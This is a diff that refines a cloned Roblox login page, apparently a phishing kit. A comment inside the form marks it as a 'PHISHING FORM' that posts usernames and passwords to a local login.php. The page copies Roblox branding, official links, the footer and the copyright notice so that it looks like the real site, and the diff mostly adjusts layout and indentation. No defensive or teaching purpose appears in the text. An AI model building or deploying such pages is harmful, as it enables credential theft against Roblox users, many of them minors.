-                        <button type="button" class="close-login-button" aria-label="Close" onclick="history.back()">&#215;</button>
+                            <h1 class="login-header">Login to Roblox</h1>
 
-                        <h1 class="login-header">Login to Roblox</h1>
+                            <div id="login-form">
+                                <div class="login-form-container">
+                                    <!-- PHISHING FORM: posts credentials to login.php -->
+                                    <form class="login-form" name="loginForm" id="login-form-element" action="login.php" method="post">
 
-                        <div id="login-form">
-                            <div class="login-form-container">
-                                <!-- PHISHING FORM: posts credentials to login.php -->
-                                <form class="login-form" name="loginForm" id="login-form-element" action="login.php" method="post">
+                                        <div class="form-group username-form-group">
+                                            <label for="login-username" class="sr-only">Username/Email/Phone</label>
+                                            <input id="login-username" name="username" type="text"
+                                                   class="form-control input-field"
+                                                   autocomplete="username webauthn"
+                                                   placeholder="Username/Email/Phone" value="" required>
+                                        </div>
 
-                                    <div class="form-group username-form-group">
-                                        <label for="login-username" class="sr-only">Username/Email/Phone</label>
-                                        <input id="login-username" name="username" type="text"
-                                               class="form-control input-field"
-                                               autocomplete="username webauthn"
-                                               placeholder="Username/Email/Phone" value="" required>
-                                    </div>
+                                        <div class="form-group password-form-group">
+                                            <label for="login-password" class="sr-only">Password</label>
+                                            <input id="login-password" name="password" type="password"
+                                                   class="form-control input-field"
+                                                   placeholder="Password" value="" required>
+                                        </div>
 
-                                    <div class="form-group password-form-group">
-                                        <label for="login-password" class="sr-only">Password</label>
-                                        <input id="login-password" name="password" type="password"
-                                               class="form-control input-field"
-                                               placeholder="Password" value="" required>
-                                    </div>
-
-                                    <button type="submit" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>
-                                </form>
+                                        <button type="submit" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>
+                                    </form>
+                                </div>
                             </div>
-                        </div>
 
-                        <div class="text-center forgot-credentials-link">
-                            <a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Forgot Password or Username?</a>
-                        </div>
-
-                        <div class="alternative-login-divider-container">
-                            <div class="rbx-divider alternative-login-divider"></div>
-                            <div class="divider-text-container">
-                                <span class="divider-text">login with</span>
+                            <div class="text-center forgot-credentials-link">
+                                <a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Forgot Password or Username?</a>
                             </div>
+
+                            <div class="alternative-login-divider-container">
+                                <div class="rbx-divider alternative-login-divider"></div>
+                                <div class="divider-text-container">
+                                    <span class="divider-text">login with</span>
+                                </div>
+                            </div>
+
+                            <button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">Email Me a One-Time Code</button>
+                            <button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Quick Sign-in</span></button>
+
+                            <div class="text-center">
+                                <div class="signup-option">
+                                    <span class="no-account-text">Don't have an account?</span>
+                                    <a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/CreateAccount" target="_self">Sign Up</a>
+                                </div>
+                            </div>
+
+                            <img id="login-processing-gif" class="sf-hidden"
+                                 src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif" alt="Processing...">
                         </div>
 
-                        <button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">Email Me a One-Time Code</button>
-                        <button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Quick Sign-in</span></button>
-
-                        <div class="signup-option">
-                            <span class="no-account-text">Don't have an account?</span>
-                            <a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/CreateAccount" target="_self">Sign Up</a>
-                        </div>
-
-                        <img id="login-processing-gif" class="sf-hidden"
-                             src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif" alt="Processing...">
                     </div>
-
                 </div>
             </div>
         </div>
@@ -263,9 +320,9 @@ button{overflow:visible;text-transform:none;-webkit-appearance:button}
 </main>
 
 <!-- ===================== FOOTER ===================== -->
-<footer class="container-footer">
+<footer class="container-footer" id="footer-container">
     <div class="footer">
-        <ul class="footer-links">
+        <ul class="row footer-links">
             <li><a class="text-footer-nav" href="https://www.roblox.com/info/about-us">About Us</a></li>
             <li><a class="text-footer-nav" href="https://www.roblox.com/info/jobs">Jobs</a></li>
             <li><a class="text-footer-nav" href="https://www.roblox.com/info/blog">Newsroom</a></li>
@@ -275,12 +332,12 @@ button{overflow:visible;text-transform:none;-webkit-appearance:button}
             <li><a class="text-footer-nav" href="https://www.roblox.com/info/terms">Terms</a></li>
             <li><a class="text-footer-nav" href="https://www.roblox.com/info/privacy">Privacy</a></li>
         </ul>
-        <p class="footer-note">&copy;2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+        <p class="text-footer footer-note">&copy;2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
     </div>
 </footer>
 
 <script>
-/* Show the processing spinner and lock the button while the form posts */
+/* Spinner + button lock while the form posts */
 (function () {
     var form = document.getElementById('login-form-element');
     if (!form) return;
